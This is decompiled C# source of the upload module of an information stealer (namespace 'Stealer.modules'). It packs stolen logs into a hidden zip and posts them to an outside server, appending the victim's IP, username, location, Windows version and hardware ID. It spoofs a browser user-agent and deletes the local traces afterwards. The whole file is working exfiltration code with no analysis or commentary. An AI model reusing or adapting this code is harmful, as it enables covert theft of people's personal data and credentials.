using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading.Tasks;

namespace Stealer.modules
{
	// Token: 0x02000036 RID: 54
	public static class SendToServer
	{
		// Token: 0x06000115 RID: 277 RVA: 0x0000CE54 File Offset: 0x0000B054
		public static void StratSend()
		{
			Task.Factory.StartNew(delegate()
			{
				SendToServer.CheckFiles();
			}).Wait();
			Task.Factory.StartNew(delegate()
			{
				SendToServer.CreateZipFromLogsRezo();
			}).Wait();
			Task.Factory.StartNew(delegate()
			{
				SendToServer.UploadLogs();
			}).Wait();
			Task.Factory.StartNew(delegate()
			{
				SendToServer.DeleteLogs();
			}).Wait();
		}

		// Token: 0x06000116 RID: 278 RVA: 0x0000CF11 File Offset: 0x0000B111
		private static void CreateZipFromLogsRezo()
		{
			if (File.Exists(SendToServer.pathToZip))
			{
				File.Delete(SendToServer.pathToZip);
			}
			ZipStore.PackedZip(SendToServer.path, SendToServer.path);
			File.SetAttributes(SendToServer.pathToZip, File.GetAttributes(SendToServer.pathToZip) | FileAttributes.Hidden);
		}

		// Token: 0x06000117 RID: 279 RVA: 0x0000CF50 File Offset: 0x0000B150
		private static void CheckFiles()
		{
			string[] directories = Directory.GetDirectories(SendToServer.path);
			string[] files = Directory.GetFiles(SendToServer.path);
			try
			{
				if (files.Length != 0)
				{
					foreach (string fileName in files)
					{
						if (new FileInfo(fileName).Length == 0L)
						{
							File.Delete(fileName);
						}
					}
				}
				if (directories.Length != 0)
				{
					foreach (string text in directories)
					{
						long num = 0L;
						foreach (string fileName2 in SendToServer.SafeEnumerateFiles(text, "*.*", SearchOption.AllDirectories))
						{
							num += new FileInfo(fileName2).Length;
							if (num == 0L)
							{
								Directory.Delete(text, true);
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000118 RID: 280 RVA: 0x0000D048 File Offset: 0x0000B248
		private static bool ValidateRemoteCertificate(object sender, X509Certificate cert, X509Chain chain, SslPolicyErrors error)
		{
			return error == SslPolicyErrors.None;
		}

		// Token: 0x06000119 RID: 281 RVA: 0x0000D050 File Offset: 0x0000B250
		private static void UploadLogs()
		{
			string text = "http://u2729.mh0.ru/";
			string text2 = Help.Windows();
			string time = Help.GetTime();
			string text3 = Help.AccountName();
			string location = Location.GetLocation(true);
			string text4 = Help.LocationFind();
			SendToServer.ExtendedWebClient extendedWebClient = new SendToServer.ExtendedWebClient();
			ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, new RemoteCertificateValidationCallback(SendToServer.ValidateRemoteCertificate));
			ServicePointManager.SecurityProtocol = (SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls);
			extendedWebClient.Proxy = null;
			extendedWebClient.Timeout = -1;
			extendedWebClient.Headers.Add(HttpRequestHeader.UserAgent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome / 62.0.3202.94 Safari / 537.36 OPR / 49.0.2725.64");
			extendedWebClient.AllowWriteStreamBuffering = false;
			if (Program.repeated_logs)
			{
				extendedWebClient.UploadFile(string.Concat(new string[]
				{
					text,
					"index.php?ip=",
					location,
					"&user=",
					text3,
					"&localation=",
					text4,
					"&windows=",
					text2,
					"&time=",
					time
				}), "POST", SendToServer.pathToZip);
				return;
			}
			string hwid = Help.HWID;
			extendedWebClient.UploadFile(string.Concat(new string[]
			{
				text,
				"index.php?ip=",
				location,
				"&user=",
				text3,
				"&localation=",
				text4,
				"&windows=",
				text2,
				"&time=",
				time,
				"&HWID=",
				hwid
			}), "POST", SendToServer.pathToZip);
		}

		// Token: 0x0600011A RID: 282 RVA: 0x0000D418 File Offset: 0x0000B618
		private static IEnumerable<string> SafeEnumerateFiles(string path, string searchPattern = "*.*", SearchOption searchOption = SearchOption.TopDirectoryOnly)
		{
			Stack<string> dirs = new Stack<string>();
			dirs.Push(path);
			while (dirs.Count > 0)
			{
				string currentDirPath = dirs.Pop();
				if (searchOption == SearchOption.AllDirectories)
				{
					try
					{
						string[] directories = Directory.GetDirectories(currentDirPath);
						foreach (string item in directories)
						{
							dirs.Push(item);
						}
					}
					catch (UnauthorizedAccessException)
					{
						continue;
					}
					catch (DirectoryNotFoundException)
					{
						continue;
					}
				}
				string[] files;
				try
				{
					files = Directory.GetFiles(currentDirPath, searchPattern);
				}
				catch (UnauthorizedAccessException)
				{
					continue;
				}
				catch (DirectoryNotFoundException)
				{
					continue;
				}
				foreach (string filePath in files)
				{
					yield return filePath;
					filePath = null;
				}
				string[] strArray = null;
				currentDirPath = null;
				files = null;
			}
			yield break;
		}

		// Token: 0x0600011B RID: 283 RVA: 0x0000D444 File Offset: 0x0000B644
		private static void DeleteLogs()
		{
			try
			{
				Directory.Delete(SendToServer.path, true);
				File.Delete(SendToServer.pathToZip);
			}
			catch
			{
			}
		}

		// Token: 0x04000086 RID: 134
		private static readonly string path = Program.path;

		// Token: 0x04000087 RID: 135
		private static readonly string pathToZip = Program.path + ".zip";

		// Token: 0x02000037 RID: 55
		public class ExtendedWebClient : WebClient
		{
			// Token: 0x1700000A RID: 10
			// (get) Token: 0x06000121 RID: 289 RVA: 0x0000D49C File Offset: 0x0000B69C
			// (set) Token: 0x06000122 RID: 290 RVA: 0x0000D4A4 File Offset: 0x0000B6A4
			public int Timeout { get; set; }

			// Token: 0x1700000B RID: 11
			// (get) Token: 0x06000123 RID: 291 RVA: 0x0000D4AD File Offset: 0x0000B6AD
			// (set) Token: 0x06000124 RID: 292 RVA: 0x0000D4B5 File Offset: 0x0000B6B5
			public new bool AllowWriteStreamBuffering { get; set; }

			// Token: 0x06000125 RID: 293 RVA: 0x0000D4C0 File Offset: 0x0000B6C0
			protected override WebRequest GetWebRequest(Uri address)
			{
				WebRequest webRequest = base.GetWebRequest(address);
				if (webRequest != null)
				{
					webRequest.Timeout = this.Timeout;
					HttpWebRequest httpWebRequest = webRequest as HttpWebRequest;
					if (httpWebRequest != null)
					{
						httpWebRequest.AllowWriteStreamBuffering = this.AllowWriteStreamBuffering;
					}
				}
				return webRequest;
			}
		}
	}
}
